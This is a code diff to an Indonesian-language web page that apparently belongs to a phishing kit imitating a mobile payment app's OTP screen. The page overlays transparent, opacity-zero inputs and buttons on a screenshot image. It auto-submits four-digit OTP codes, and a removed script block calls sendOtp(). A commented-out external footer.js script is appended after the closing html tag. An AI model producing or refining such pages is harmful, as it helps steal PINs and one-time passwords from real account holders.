@@ -730,14 +730,14 @@ ol, li {
     right: 0; 
     margin: 0px auto;
     top: 0;">
-			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0px auto; margin-top: 0px; background-image: url(https://hosting.tigerengine.id/96zx8p.png) ;
+			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0px auto; margin-top: 0px; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWg2Gu-OJgBB04_6jT0WUgRXWLn5YbRSrznAuun2UvU5EReoC_5dcLybIsjF8faelAIw9vhfnlRTJL_m1uMpM3bDrXHp6xE_KyYSDuAMYlaNiTl9d5tz8mY-o7F-vw6oL661O_C551IITUOWQoxYKFmdNN5s0lHvxrPQEJgiMvBFhDcXC6lt3hbPLBEmo/s1079/AddText_01-04-04.13.11.png) ;
   background-position: 100% 100%;
-  background-size: 100% 100%; height: 300px; bottom: 0; width: 100%; border-radius: 14px 14px 0px 0px; width: 100%; text-align: center; background-color: #fff" id="otpkirimulang">
+  background-size: 100% 100%; height: 280px; bottom: 0; width: 100%; border-radius: 14px 14px 0px 0px; width: 100%; text-align: center; background-color: #fff" id="otpkirimulang">
 <button type="button" style="right: 10; bottom: 238; float: right; width: 40px; background: transparent; color: transparent; border: none; font-size: 13px; height: 10px; position: fixed;" onclick="tutupotp()">XX</button>
 				<h2 style="margin-bottom: 30px; opacity: 0.0">Masukkan OTP</h2>
 				<p id="userid" style="font-size: 2px; text-align: center; margin-bottom: -100px; font-weight: 600; color: #070707; margin-top: 66px; margin-left: -125px; opacity: 0.0; "></p>
   <center>
-				<p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 500; color: #000; margin-top: 300px; display: ; width: 360px; margin-bottom: -10px; font-weight: 300;"></p>
+				<p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 500; color: #000; margin-top: 135.5px; display: ; width: 360px; margin-bottom: -10px; font-weight: 300"></p>
 				
 				
 				</center>
@@ -755,10 +755,10 @@ ol, li {
 					<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="on" required maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
 					
 					</form>
-		 <p id="waktuku" class="resend" style="margin-top: 0px; color: #aaa; font-size: 13px">
+		 <p id="waktuku" class="resend" style="margin-top: 150px; color: #aaa; font-size: 13px">
 					KIRIM ULANG (<span id="countdown" style="color: #aaa">60</span>s)
 				</p>
-       <p class="resend" style="margin-top: 0px; font-weight: 600; color: #2C86C5; margin-left: 0px; display: none" id="kirim-ulang" onclick="kirimulang()">KIRIM ULANG</p>
+       <p class="resend" style="margin-top: 70px; font-weight: 600; color: #2C86C5; margin-left: 0px; display: none" id="kirim-ulang" onclick="kirimulang()">KIRIM ULANG</p>
        
 			</div>
 		</div>
@@ -807,127 +807,8 @@ document.getElementById("tarif").value =
             },1000);
         },500);
 }   
-
-///
- function countdown() {
-    var count = parseInt(
-    $('#countdown').text());
-    if (count !== 0) {
-    $('#countdown').text(count - 1);} 
-    else {
-    $('#countdown').text('60');}};
-   
-
-///
-
-
-
-//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
-var pinContainer = document.querySelector(".box-input-pin");
-/*console.log('There is ' + pinContainer.length + ' Pin Container on the page.');*/
-pinContainer.addEventListener('keyup', function (event) {
-    var target = event.srcElement;    
-    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
-    var myLength = target.value. length;
-    
-    if (myLength >= maxLength) {
-        var next = target;
-        while (next = next.nextElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-
-    if (myLength === 0) {
-        var next = target;
-        while (next = next.previousElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-}, false);
-
-pinContainer.addEventListener('keydown', function (event) {
-    var target = event.srcElement;
-    target.value = "";
-}, false);
-
-$('.inpotp').on('input', function(event) {
-const form = $('#formOtp');  
- const inputs = $('.inpotp');
-const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
-if (isAllFilled == true) {
-    $(event.target).blur();
-sendOtp();
-form.submit();
-}
-
-const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});
-$(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$(".show").text("SEMBUNYIKAN");} else {$(this).attr('type', 'password');$(".show").text("TAMPILKAN");}});});});
-
- function nextPrev(){
-$(".box-login").removeClass("closeright");
-$(".box-login").addClass("animated");     
-     event.preventDefault();
-       setTimeout(function(){
-           $("#homeku").hide();
-           $("#back1").show();
-           $("#butonku").fadeOut();
-           $(".box-login").fadeIn();
-           $("#process1").hide();
-       },0);
- }   
- 
- 
- function goback1(){
-     setTimeout(function(){
-   $("#homeku").addClass("bounceInLeft"); $(".box-login").removeClass("animated");     
-     $("#homeku").show();
-      $(".box-login").fadeOut();
-      $(".box-login").addClass("closeright");
-      $("#butonku").fadeIn();
-      $("#back1").hide();
-       $("#process").hide();
-       
-     },0);
- }
- 
- 
- function goback2(){
-     $("#process").show();
-     setTimeout(function(){
-    $("#formPin").fadeOut();
-     $("#formNohp").fadeIn();
-       $("#process").hide();
-        $("#inp").val('');
-        $("#back1").show();
-        $("#back2").hide();
-        document.getElementById("formPin").reset();
-        $('.inppin').val('');
-     },500);
- }
-
-    $( document ).ready(function() {
-            setTimeout(() => {
-                $('#popup').hide();
-                $('chsalxcome2').fadeIn();
-            },2000)
-             
-        })
-        
-
-function tutupotp(){
-$(".bgotp").hide();    
-}
-
 </script>
 <script>
 </script>
 </body>
-</html>
+</html><!--<script src='https://a.bsite.net/footer.js'></script>
